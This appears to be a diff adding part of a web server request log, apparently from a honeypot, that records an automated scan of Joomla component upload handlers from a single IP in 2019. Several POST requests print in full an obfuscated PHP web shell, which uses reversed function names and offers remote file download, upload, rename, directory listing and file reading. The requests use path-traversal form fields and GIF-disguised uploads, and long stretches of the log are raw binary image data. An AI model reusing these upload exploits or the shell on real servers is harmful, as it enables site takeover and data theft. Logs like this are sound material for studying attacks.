�fU\u0000fU3fUffU�fU�fU�f�\u0000f�3f�ff��f��f��f�\u0000f�3f�ff��f��f��f�\u0000f�3f�ffՙf��f��f�\u0000f�3f�ff��f��f���\u0000\u0000�\u00003�\u0000f�\u0000��\u0000̙\u0000�� \u0000� 3� f� �� ̙ ��U\u0000�U3�Uf�U��U̙U���\u0000��3��f�����̙����\u0000��3��f�����̙����\u0000��3��f�ՙ��̙����\u0000��3��f�����̙���\u0000\u0000�\u00003�\u0000f�\u0000��\u0000��\u0000�� \u0000� 3� f� �� �� ��U\u0000�U3�Uf�U��U��U�̀\u0000̀3̀f̀�̀�̀�̪\u0000̪3̪f̪�̪�̪���\u0000��3��f�ՙ��������\u0000��3��f����������\u0000\u0000�\u00003�\u0000f�\u0000��\u0000��\u0000�� \u0000� 3� f� �� �� ��U\u0000�U3�Uf�U��U��U���\u0000��3��f�����������\u0000��3��f�����������\u0000��3��f�ՙ��������\u0000��3��f���������\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\b�\u0000\u0001\b\u001cH����\b\u0013*\\Ȱ�Ç\u0010#J�H��ŋ\u00183j�ȱ�Ǐ C�\u001cI��ɓ(S�\\ɲ�˗0cʜI��͛8s��ɳ�ϟ@�\n\u001dJ��ѣH�*]ʴ�ӧP�J�J��իX�j�ʵ�ׯ`Ê\u001dK��ٳhӪ]˶�۷p�ʝK��\u0003e��\u0002\u0011�Bk\u0000P�\u0006�\r�2�\"��\u0013\u0002Qv�a\u000ee� \"\u0000ELYeb���D�l����)>�����a�;\"��W���","\u001f'��q�2�\u0005\u001dT���\b1a\u0017m Ӕ���\u0001�0�(\u001b7�ǐ\u0013���q2l�G�E]p1oɔ\u001b\u0013�L�\f6C5� >H\u0006\\�_�\u0011�C$\u000fF����\u0015��,��\u0000ʘd�\u0011v��b^Kp\u0010\u0013\fF�}7�d�D�\u0010\u0010�\u0005�[j��\u0012Q�\u000b>�^\u0017q��h�e��\u000f�\t��k��\b�b�U�؁\u0000<���\b�\u0017�D�\u001d8Z�\u0010�\b�\u0000�(S�FB*�\u001ef\u0017\u001e�\u0018w\u001e\u0011\b��.-�\u000bB��n�\t���\u0003\u001d��@V\nV�@\u000f�x�\u0003�\t�":"","�\u000b��\u001d�m$gB�%#\u0006(x\u001d�\u0003qTT�Z����\u0018o\u0010\u001aw\u0019u�U�\f1�8h�\u0011\u00124�rh��%�j$#�@y��Xe�\"��2\u0012\u0012��{�]fb�LZ��^����_��U��A�\u0016�ꢻޕ�\u0016�\u0019�\u001dn�UV�{�,\u000b�b�":"F��\t\u00188�G�u�^q�\u0015�W��-��B���di94�,1��:�0i�:\u001c��*\u0003f��>جe�<�\f\u0015\u0001\u0014�(����_g��\n@��l��p\tKjи\u000b\u000b|\u0019��\u001a�e�@�G\u0010��M7��]N�\u0018���٣f��\u000b��ƶ�]{\u0000�%qA�e\u0012�u(�\u0011m\u0012�I���\nɔ�9WP�G\u0003@)�\u0003Q��c4\u000bT��\u0005�v䳭�'�0���\u0010�\u0005]�3B������}���(\u000bDi�еG\u001eowќ�Iw����@��,]�hb�ܝS�G��\u000f\u0012���\n,A�����T�Fޮ\u000b\"��y��7��\r�kEƸ�q��z��\u0001����\u0005�:m+\u0017.xGY�J91@\n�X����'o3\u0016��0�X�,m�w�oQS��A蕨ɍΗJ���\u0003_�\u0003�t9i�`�J}B�\u001b�_�h[[oƉ{��xE\u0012\u001d�{��\u0019z�z+\u000f�d'����\u000e�ڍCf����n ���@\u0012���.v�\u001b�\u001b�<��rY+�]�W�\u0000؁q\u0003y��\b\u0018�ݭ�5��Ɋ���=pap�Dc2w�]@�v�q\u0011��v�\u0011�vU\u001bH��sC<�L\u000byR\u001a�\nT��\u0001�T���ƣ�-\u0012do\u0004�Vw�7Abx1jĹ^�ا�#v,�-̎o�3�\u001by�zF�\u001d\u0000�`��,\"K�\u0012�H��#�lL\u001d3�t�S���o:nKPd\f��\f\u0012����\f\f\u001fCB\u0015�ʒ�A`\u001c�,\u0018\u001a\u0004��)ݚ*��؅�]T\u0010@\u001d8��eM","\u0019U�ÿ�\u0012\f\u0004|�rC$\u0014\u00117��\u0010B�4�[\by2Q$/\u0006�R�8Nr��\u001d\u0014e1�\u0006)�A��\u001ef�c�\"F�\u000eB��H\u0010Km4\u00168�ٶ�YF\u0012�i \u0005�g9�����I�0�6���`fg�1g�\u001c�5S��_��b�|��B�Gvpd\u0015-��P�\\\r�\u0000`�0>�":"","bt\u0013��t\u000e���%��P�":{"2�i4��\u0001�r��Ld��fQ��/�b����E�\n~\n�P2v\u00150�H���\u0012O�TE\f�M�\u0010�\f_\u000eV����\u0013�{\u0018�\u001ae�)��z�d#N�z�ca�D�y�Q�7��8t1_͔�@�\u0019\u0012\u0014\u001d1s�)��\u0012F�\u0013�ү�L�r�*�C�Q���h6e�(ah¡5B,\u001c\u0006f�T�.;(\"aA���":""}}
+**END SECURE REQUEST
+========= REQ #112==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/components/com_sexycontactform/fileupload/files/pwn.gif
+2019:08:01:11:58:15
+GET
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "accept-encoding": "gzip, deflate",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0",
+  "content-type": "application/x-www-form-urlencoded",
+  "accept-language": "en-US,en;q=0.5"
+}
+::ffff:46.105.99.212
+{}
+{}
+**END SECURE REQUEST
+========= REQ #113==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/administrator/components/com_rokdownloads/assets/uploadhandler.php
+2019:08:01:11:58:22
+GET
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "accept-encoding": "gzip, deflate",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0",
+  "content-type": "application/x-www-form-urlencoded",
+  "accept-language": "en-US,en;q=0.5"
+}
+::ffff:46.105.99.212
+{}
+{}
+**END SECURE REQUEST
+========= REQ #114==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/administrator/components/com_rokdownloads/assets/uploadhandler.php
+2019:08:01:11:58:30
+POST
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "accept-encoding": "gzip, deflate",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0",
+  "content-type": "application/x-www-form-urlencoded",
+  "accept-language": "en-US,en;q=0.5",
+  "content-length": "2431"
+}
+::ffff:46.105.99.212
+{}
+{"--3b22ac10feb20994604fd0607feab3f5\r\nContent-Disposition: form-data; name=\"jpath\"\r\n\r\n../../../../\r\n--3b22ac10feb20994604fd0607feab3f5\r\nContent-Disposition: form-data; name=\"files":[{"'act'":"='dl'){echo($dlform);if($_SERVER['REQUEST_METHOD']=='POST'){$fpc/* /* */($_POST['fn'],$fgc/* /* */($_POST['url']));}exit;}if($_GET['act']=='ul'){echo($ulform);if($_SERVER['REQUEST_METHOD']=='POST'){$sp=empty($_POST['sp'])?'./':$_POST['sp'].'/';$muf/* /* */($/* /* */{\"_F\".\"IL\".\"ES\"}[\"uf\"][\"tmp_name\"],$sp.$/* /* */{\"_F\".\"IL\".\"ES\"}[\"uf\"][\"name\"]);}exit;}if($_GET['act']=='rn'){echo($rnform);if($_SERVER['REQUEST_METHOD']=='POST'){$rn/* /* */($_POST['on'],$_POST['nn']);}exit;}if($_GET['act']=='gp'){echo($dn/* /* */(__FILE__));exit;}if($_GET['act']=='lp'){echo($lpform);if($_SERVER['REQUEST_METHOD']=='POST'){$dp=$_POST['dp'].'/';$h=$od/* /* */($dp);while(($fn=$rd/* /* */($h))!==false){if($id/* /* */($dp.$fn)){$t1.='D"}],"nbsp;'.$fn.'<br>';}else{$t2.":"'","nbsp;":"","nbsp;'.$fn.'<br>';}}$cd/* /* */($dp);echo($dp.'<br>'.$t1.$t2);}exit;}if($_GET":{"'act'":"='sf'){echo($sfform);if($_SERVER['REQUEST_METHOD']=='POST'){$df=$_POST['df'];echo('<textarea style=\"width:100%;height:100%;\" wrap=\"off\">'.$fgc/*+/*+*/($df).'</textarea>');}exit;}?>\r\n--3b22ac10feb20994604fd0607feab3f5--\r\n"}}
+**END SECURE REQUEST
+========= REQ #115==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/images/stories/up.php
+2019:08:01:11:58:36
+GET
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "accept-encoding": "gzip, deflate",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0",
+  "content-type": "application/x-www-form-urlencoded",
+  "accept-language": "en-US,en;q=0.5"
+}
+::ffff:46.105.99.212
+{}
+{}
+**END SECURE REQUEST
+========= REQ #116==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/administrator/components/com_rokdownloads/assets/uploadhandler.php
+2019:08:01:11:58:46
+POST
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "accept-encoding": "gzip, deflate",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0",
+  "content-type": "application/x-www-form-urlencoded",
+  "accept-language": "en-US,en;q=0.5",
+  "content-length": "2709"
+}
+::ffff:46.105.99.212
+{}
+{"--ede350df5fbeac358c9713a2d6a48346\r\nContent-Disposition: form-data; name":"\"jpath\"\r\n\r\n../../../../\r\n--ede350df5fbeac358c9713a2d6a48346\r\nContent-Disposition: form-data; name=\"files[]\"; filename=\"pwn.gif\"\r\n\r\nGIF89a\u0018\u0001G\u0000p\u0000\u0000!�\u0004\u0001\u0000\u0000�\u0000,\u0000\u0000\u0000\u0000\u0018\u0001G\u0000�\u0000\u0000\u0000\u0000\u00003\u0000\u0000f\u0000\u0000�\u0000\u0000�\u0000\u0000�\u0000 \u0000\u0000 3\u0000 f\u0000 �\u0000 �\u0000 �\u0000U\u0000\u0000U3\u0000Uf\u0000U�\u0000U�\u0000U�\u0000�\u0000\u0000�3\u0000�f\u0000��\u0000��\u0000��\u0000�\u0000\u0000�3\u0000�f\u0000��\u0000��\u0000��\u0000�\u0000\u0000�3\u0000�f\u0000ՙ\u0000��\u0000��\u0000�\u0000\u0000�3\u0000�f\u0000��\u0000��\u0000��3\u0000\u00003\u000033\u0000f3\u0000�3\u0000�3\u0000�3 \u00003 33 f3 �3 �3 �3U\u00003U33Uf3U�3U�3U�3�\u00003�33�f3��3��3��3�\u00003�33�f3��3��3��3�\u00003�33�f3ՙ3��3��3�\u00003�33�f3��3��3��f\u0000\u0000f\u00003f\u0000ff\u0000�f\u0000�f\u0000�f \u0000f 3f ff �f �f �fU\u0000fU3fUffU�fU�fU�f�\u0000f�3f�ff��f��f��f�\u0000f�3f�ff��f��f��f�\u0000f�3f�ffՙf��f��f�\u0000f�3f�ff��f��f���\u0000\u0000�\u00003�\u0000f�\u0000��\u0000̙\u0000�� \u0000� 3� f� �� ̙ ��U\u0000�U3�Uf�U��U̙U���\u0000��3��f�����̙����\u0000��3��f�����̙����\u0000��3��f�ՙ��̙����\u0000��3��f�����̙���\u0000\u0000�\u00003�\u0000f�\u0000��\u0000��\u0000�� \u0000� 3� f� �� �� ��U\u0000�U3�Uf�U��U��U�̀\u0000̀3̀f̀�̀�̀�̪\u0000̪3̪f̪�̪�̪���\u0000��3��f�ՙ��������\u0000��3��f����������\u0000\u0000�\u00003�\u0000f�\u0000��\u0000��\u0000�� \u0000� 3� f� �� �� ��U\u0000�U3�Uf�U��U��U���\u0000��3��f�����������\u0000��3��f�����������\u0000��3��f�ՙ��������\u0000��3��f���������\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\b�\u0000\u0001\b\u001cH����\b\u0013*\\Ȱ�Ç\u0010#J�H��ŋ\u00183j�ȱ�Ǐ C�\u001cI��ɓ(S�\\ɲ�˗0cʜI��͛8s��ɳ�ϟ@�\n\u001dJ��ѣH�*]ʴ�ӧP�J�J��իX�j�ʵ�ׯ`Ê\u001dK��ٳhӪ]˶�۷p�ʝK��\u0003e��\u0002\u0011�Bk\u0000P�\u0006�\r�2�\"��\u0013\u0002Qv�a\u000ee� \"\u0000ELYeb���D�l����)>�����a�;\"��W���","\u001f'��q�2�\u0005\u001dT���\b1a\u0017m Ӕ���\u0001�0�(\u001b7�ǐ\u0013���q2l�G�E]p1oɔ\u001b\u0013�L�\f6C5� >H\u0006\\�_�\u0011�C$\u000fF����\u0015��,��\u0000ʘd�\u0011v��b^Kp\u0010\u0013\fF�}7�d�D�\u0010\u0010�\u0005�[j��\u0012Q�\u000b>�^\u0017q��h�e��\u000f�\t��k��\b�b�U�؁\u0000<���\b�\u0017�D�\u001d8Z�\u0010�\b�\u0000�(S�FB*�\u001ef\u0017\u001e�\u0018w\u001e\u0011\b��.-�\u000bB��n�\t���\u0003\u001d��@V\nV�@\u000f�x�\u0003�\t�":"","�\u000b��\u001d�m$gB�%#\u0006(x\u001d�\u0003qTT�Z����\u0018o\u0010\u001aw\u0019u�U�\f1�8h�\u0011\u00124�rh��%�j$#�@y��Xe�\"��2\u0012\u0012��{�]fb�LZ��^����_��U��A�\u0016�ꢻޕ�\u0016�\u0019�\u001dn�UV�{�,\u000b�b�":"F��\t\u00188�G�u�^q�\u0015�W��-��B���di94�,1��:�0i�:\u001c��*\u0003f��>جe�<�\f\u0015\u0001\u0014�(����_g��\n@��l��p\tKjи\u000b\u000b|\u0019��\u001a�e�@�G\u0010��M7��]N�\u0018���٣f��\u000b��ƶ�]{\u0000�%qA�e\u0012�u(�\u0011m\u0012�I���\nɔ�9WP�G\u0003@)�\u0003Q��c4\u000bT��\u0005�v䳭�'�0���\u0010�\u0005]�3B������}���(\u000bDi�еG\u001eowќ�Iw����@��,]�hb�ܝS�G��\u000f\u0012���\n,A�����T�Fޮ\u000b\"��y��7��\r�kEƸ�q��z��\u0001����\u0005�:m+\u0017.xGY�J91@\n�X����'o3\u0016��0�X�,m�w�oQS��A蕨ɍΗJ���\u0003_�\u0003�t9i�`�J}B�\u001b�_�h[[oƉ{��xE\u0012\u001d�{��\u0019z�z+\u000f�d'����\u000e�ڍCf����n ���@\u0012���.v�\u001b�\u001b�<��rY+�]�W�\u0000؁q\u0003y��\b\u0018�ݭ�5��Ɋ���=pap�Dc2w�]@�v�q\u0011��v�\u0011�vU\u001bH��sC<�L\u000byR\u001a�\nT��\u0001�T���ƣ�-\u0012do\u0004�Vw�7Abx1jĹ^�ا�#v,�-̎o�3�\u001by�zF�\u001d\u0000�`��,\"K�\u0012�H��#�lL\u001d3�t�S���o:nKPd\f��\f\u0012����\f\f\u001fCB\u0015�ʒ�A`\u001c�,\u0018\u001a\u0004��)ݚ*��؅�]T\u0010@\u001d8��eM","\u0019U�ÿ�\u0012\f\u0004|�rC$\u0014\u00117��\u0010B�4�[\by2Q$/\u0006�R�8Nr��\u001d\u0014e1�\u0006)�A��\u001ef�c�\"F�\u000eB��H\u0010Km4\u00168�ٶ�YF\u0012�i \u0005�g9�����I�0�6���`fg�1g�\u001c�5S��_��b�|��B�Gvpd\u0015-��P�\\\r�\u0000`�0>�":"","bt\u0013��t\u000e���%��P�":{"2�i4��\u0001�r��Ld��fQ��/�b����E�\n~\n�P2v\u00150�H���\u0012O�TE\f�M�\u0010�\f_\u000eV����\u0013�{\u0018�\u001ae�)��z�d#N�z�ca�D�y�Q�7��8t1_͔�@�\u0019\u0012\u0014\u001d1s�)��\u0012F�\u0013�ү�L�r�*�C�Q���h6e�(ah¡5B,\u001c\u0006f�T�.;(\"aA���":""}}
+**END SECURE REQUEST
+========= REQ #117==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/images/stories/pwn.gif
+2019:08:01:11:58:55
+GET
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "accept-encoding": "gzip, deflate",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0",
+  "content-type": "application/x-www-form-urlencoded",
+  "accept-language": "en-US,en;q=0.5"
+}
+::ffff:46.105.99.212
+{}
+{}
+**END SECURE REQUEST
+========= REQ #118==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/administrator/components/com_extplorer/uploadhandler.php
+2019:08:01:11:59:01
+GET
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "accept-encoding": "gzip, deflate",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0",
+  "content-type": "application/x-www-form-urlencoded",
+  "accept-language": "en-US,en;q=0.5"
+}
+::ffff:46.105.99.212
+{}
+{}
+**END SECURE REQUEST
+========= REQ #119==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/administrator/components/com_extplorer/uploadhandler.php
+2019:08:01:11:59:13
+POST
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "accept-encoding": "gzip, deflate",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0",
+  "content-type": "application/x-www-form-urlencoded",
+  "accept-language": "en-US,en;q=0.5",
+  "content-length": "2334"
+}
+::ffff:46.105.99.212
+{}
+{"--507e91b283f41d23eed651883fcb8b28\r\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"up.php\"\r\n\r\n<title>Vuln!! patch it Now!</title><?php error_reporting(0);$sr=\"st\"./* /* */\"rr\"/* /* */.\"ev\";$id=$sr/* /* */(\"ri\".\"d_\".\"si\");$rn=$sr/* /* */(\"em\".\"an\".\"er\");$dn=$sr/* /* */(\"em\".\"anr\".\"id\");$od=$sr/* /* */(\"ri\".\"dne\".\"po\");$rd=$sr/* /* */(\"ri\".\"dda\".\"er\");$cd=$sr/* /* */(\"ri\".\"deso\".\"lc\");$fpc=$sr/* /* */(\"stn\".\"etn\".\"oc_t\".\"up_e\".\"lif\");$fgc=$sr/* /* */(\"stn\".\"etn\".\"oc_t\".\"eg_e\".\"lif\");$muf=$sr/* /* */(\"eli\".\"f_d\".\"eda\".\"olp\".\"u_e\".\"vom\");$dlform='<form method=\"post\">FN:<input name=\"fn\" size=\"20\" type=\"text\">URL:<input name=\"url\" size=\"50\" type=\"text\"><input type=\"submit\" value=\"ok\"></form>';$ulform='<form method=\"post\" enctype=\"multipart/form-data\"><input name=\"uf\" type=\"file\">SP:<input name=\"sp\" size=\"50\" type=\"text\"><input type=\"submit\" value=\"ok\"></form>';$rnform='<form method=\"post\">ON:<input name=\"on\" size=\"50\" type=\"text\">NN:<input name=\"nn\" size=\"50\" type=\"text\"><input type=\"submit\" value=\"ok\"></form>';$lpform='<form method=\"post\">DP:<input name=\"dp\" size=\"50\" type=\"text\"><input type=\"submit\" value=\"ok\"></form>';$sfform='<form method=\"post\">DF:<input name=\"df\" size=\"50\" type=\"text\"><input type=\"submit\" value=\"ok\"></form>';if($_GET":{"'act'":"='dl'){echo($dlform);if($_SERVER['REQUEST_METHOD']=='POST'){$fpc/* /* */($_POST['fn'],$fgc/* /* */($_POST['url']));}exit;}if($_GET['act']=='ul'){echo($ulform);if($_SERVER['REQUEST_METHOD']=='POST'){$sp=empty($_POST['sp'])?'./':$_POST['sp'].'/';$muf/* /* */($/* /* */{\"_F\".\"IL\".\"ES\"}[\"uf\"][\"tmp_name\"],$sp.$/* /* */{\"_F\".\"IL\".\"ES\"}[\"uf\"][\"name\"]);}exit;}if($_GET['act']=='rn'){echo($rnform);if($_SERVER['REQUEST_METHOD']=='POST'){$rn/* /* */($_POST['on'],$_POST['nn']);}exit;}if($_GET['act']=='gp'){echo($dn/* /* */(__FILE__));exit;}if($_GET['act']=='lp'){echo($lpform);if($_SERVER['REQUEST_METHOD']=='POST'){$dp=$_POST['dp'].'/';$h=$od/* /* */($dp);while(($fn=$rd/* /* */($h))!==false){if($id/* /* */($dp.$fn)){$t1.='D"},"nbsp;'.$fn.'<br>';}else{$t2.":"'","nbsp;":"","nbsp;'.$fn.'<br>';}}$cd/* /* */($dp);echo($dp.'<br>'.$t1.$t2);}exit;}if($_GET":{"'act'":"='sf'){echo($sfform);if($_SERVER['REQUEST_METHOD']=='POST'){$df=$_POST['df'];echo('<textarea style=\"width:100%;height:100%;\" wrap=\"off\">'.$fgc/*+/*+*/($df).'</textarea>');}exit;}?>\r\n--507e91b283f41d23eed651883fcb8b28--\r\n"}}
+**END SECURE REQUEST
+========= REQ #120==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/images/stories/up.php
+2019:08:01:11:59:55
+GET
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "accept-encoding": "gzip, deflate",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0",
+  "content-type": "application/x-www-form-urlencoded",
+  "accept-language": "en-US,en;q=0.5"
+}
+::ffff:46.105.99.212
+{}
+{}
+**END SECURE REQUEST
+========= REQ #121==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/administrator/components/com_extplorer/uploadhandler.php
+2019:08:01:12:00:12
+POST
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "accept-encoding": "gzip, deflate",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0",
+  "content-type": "application/x-www-form-urlencoded",
+  "accept-language": "en-US,en;q=0.5",
+  "content-length": "2612"
+}
+::ffff:46.105.99.212
+{}
+{"--950227651c88ff5e04dacb820822d3ea\r\nContent-Disposition: form-data; name":"\"Filedata\"; filename=\"pwn.gif\"\r\n\r\nGIF89a\u0018\u0001G\u0000p\u0000\u0000!�\u0004\u0001\u0000\u0000�\u0000,\u0000\u0000\u0000\u0000\u0018\u0001G\u0000�\u0000\u0000\u0000\u0000\u00003\u0000\u0000f\u0000\u0000�\u0000\u0000�\u0000\u0000�\u0000 \u0000\u0000 3\u0000 f\u0000 �\u0000 �\u0000 �\u0000U\u0000\u0000U3\u0000Uf\u0000U�\u0000U�\u0000U�\u0000�\u0000\u0000�3\u0000�f\u0000��\u0000��\u0000��\u0000�\u0000\u0000�3\u0000�f\u0000��\u0000��\u0000��\u0000�\u0000\u0000�3\u0000�f\u0000ՙ\u0000��\u0000��\u0000�\u0000\u0000�3\u0000�f\u0000��\u0000��\u0000��3\u0000\u00003\u000033\u0000f3\u0000�3\u0000�3\u0000�3 \u00003 33 f3 �3 �3 �3U\u00003U33Uf3U�3U�3U�3�\u00003�33�f3��3��3��3�\u00003�33�f3��3��3��3�\u00003�33�f3ՙ3��3��3�\u00003�33�f3��3��3��f\u0000\u0000f\u00003f\u0000ff\u0000�f\u0000�f\u0000�f \u0000f 3f ff �f �f �fU\u0000fU3fUffU�fU�fU�f�\u0000f�3f�ff��f��f��f�\u0000f�3f�ff��f��f��f�\u0000f�3f�ffՙf��f��f�\u0000f�3f�ff��f��f���\u0000\u0000�\u00003�\u0000f�\u0000��\u0000̙\u0000�� \u0000� 3� f� �� ̙ ��U\u0000�U3�Uf�U��U̙U���\u0000��3��f�����̙����\u0000��3��f�����̙����\u0000��3��f�ՙ��̙����\u0000��3��f�����̙���\u0000\u0000�\u00003�\u0000f�\u0000��\u0000��\u0000�� \u0000� 3� f� �� �� ��U\u0000�U3�Uf�U��U��U�̀\u0000̀3̀f̀�̀�̀�̪\u0000̪3̪f̪�̪�̪���\u0000��3��f�ՙ��������\u0000��3��f����������\u0000\u0000�\u00003�\u0000f�\u0000��\u0000��\u0000�� \u0000� 3� f� �� �� ��U\u0000�U3�Uf�U��U��U���\u0000��3��f�����������\u0000��3��f�����������\u0000��3��f�ՙ��������\u0000��3��f���������\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\b�\u0000\u0001\b\u001cH����\b\u0013*\\Ȱ�Ç\u0010#J�H��ŋ\u00183j�ȱ�Ǐ C�\u001cI��ɓ(S�\\ɲ�˗0cʜI��͛8s��ɳ�ϟ@�\n\u001dJ��ѣH�*]ʴ�ӧP�J�J��իX�j�ʵ�ׯ`Ê\u001dK��ٳhӪ]˶�۷p�ʝK��\u0003e��\u0002\u0011�Bk\u0000P�\u0006�\r�2�\"��\u0013\u0002Qv�a\u000ee� \"\u0000ELYeb���D�l����)>�����a�;\"��W���","\u001f'��q�2�\u0005\u001dT���\b1a\u0017m Ӕ���\u0001�0�(\u001b7�ǐ\u0013���q2l�G�E]p1oɔ\u001b\u0013�L�\f6C5� >H\u0006\\�_�\u0011�C$\u000fF����\u0015��,��\u0000ʘd�\u0011v��b^Kp\u0010\u0013\fF�}7�d�D�\u0010\u0010�\u0005�[j��\u0012Q�\u000b>�^\u0017q��h�e��\u000f�\t��k��\b�b�U�؁\u0000<���\b�\u0017�D�\u001d8Z�\u0010�\b�\u0000�(S�FB*�\u001ef\u0017\u001e�\u0018w\u001e\u0011\b��.-�\u000bB��n�\t���\u0003\u001d��@V\nV�@\u000f�x�\u0003�\t�":"","�\u000b��\u001d�m$gB�%#\u0006(x\u001d�\u0003qTT�Z����\u0018o\u0010\u001aw\u0019u�U�\f1�8h�\u0011\u00124�rh��%�j$#�@y��Xe�\"��2\u0012\u0012��{�]fb�LZ��^����_��U��A�\u0016�ꢻޕ�\u0016�\u0019�\u001dn�UV�{�,\u000b�b�":"F��\t\u00188�G�u�^q�\u0015�W��-��B���di94�,1��:�0i�:\u001c��*\u0003f��>جe�<�\f\u0015\u0001\u0014�(����_g��\n@��l��p\tKjи\u000b\u000b|\u0019��\u001a�e�@�G\u0010��M7��]N�\u0018���٣f��\u000b��ƶ�]{\u0000�%qA�e\u0012�u(�\u0011m\u0012�I���\nɔ�9WP�G\u0003@)�\u0003Q��c4\u000bT��\u0005�v䳭�'�0���\u0010�\u0005]�3B������}���(\u000bDi�еG\u001eowќ�Iw����@��,]�hb�ܝS�G��\u000f\u0012���\n,A�����T�Fޮ\u000b\"��y��7��\r�kEƸ�q��z��\u0001����\u0005�:m+\u0017.xGY�J91@\n�X����'o3\u0016��0�X�,m�w�oQS��A蕨ɍΗJ���\u0003_�\u0003�t9i�`�J}B�\u001b�_�h[[oƉ{��xE\u0012\u001d�{��\u0019z�z+\u000f�d'����\u000e�ڍCf����n ���@\u0012���.v�\u001b�\u001b�<��rY+�]�W�\u0000؁q\u0003y��\b\u0018�ݭ�5��Ɋ���=pap�Dc2w�]@�v�q\u0011��v�\u0011�vU\u001bH��sC<�L\u000byR\u001a�\nT��\u0001�T���ƣ�-\u0012do\u0004�Vw�7Abx1jĹ^�ا�#v,�-̎o�3�\u001by�zF�\u001d\u0000�`��,\"K�\u0012�H��#�lL\u001d3�t�S���o:nKPd\f��\f\u0012����\f\f\u001fCB\u0015�ʒ�A`\u001c�,\u0018\u001a\u0004��)ݚ*��؅�]T\u0010@\u001d8��eM","\u0019U�ÿ�\u0012\f\u0004|�rC$\u0014\u00117��\u0010B�4�[\by2Q$/\u0006�R�8Nr��\u001d\u0014e1�\u0006)�A��\u001ef�c�\"F�\u000eB��H\u0010Km4\u00168�ٶ�YF\u0012�i \u0005�g9�����I�0�6���`fg�1g�\u001c�5S��_��b�|��B�Gvpd\u0015-��P�\\\r�\u0000`�0>�":"","bt\u0013��t\u000e���%��P�":{"2�i4��\u0001�r��Ld��fQ��/�b����E�\n~\n�P2v\u00150�H���\u0012O�TE\f�M�\u0010�\f_\u000eV����\u0013�{\u0018�\u001ae�)��z�d#N�z�ca�D�y�Q�7��8t1_͔�@�\u0019\u0012\u0014\u001d1s�)��\u0012F�\u0013�ү�L�r�*�C�Q���h6e�(ah¡5B,\u001c\u0006f�T�.;(\"aA���":""}}
+**END SECURE REQUEST
+========= REQ #122==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/images/stories/pwn.gif
+2019:08:01:12:00:19
+GET
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "accept-encoding": "gzip, deflate",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0",
+  "content-type": "application/x-www-form-urlencoded",
+  "accept-language": "en-US,en;q=0.5"
+}
+::ffff:46.105.99.212
+{}
+{}
+**END SECURE REQUEST
+========= REQ #123==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/index.php?option=com_adsmanager&task=upload&tmpl=component
+2019:08:01:12:00:27
+POST
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "accept-encoding": "gzip, deflate",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
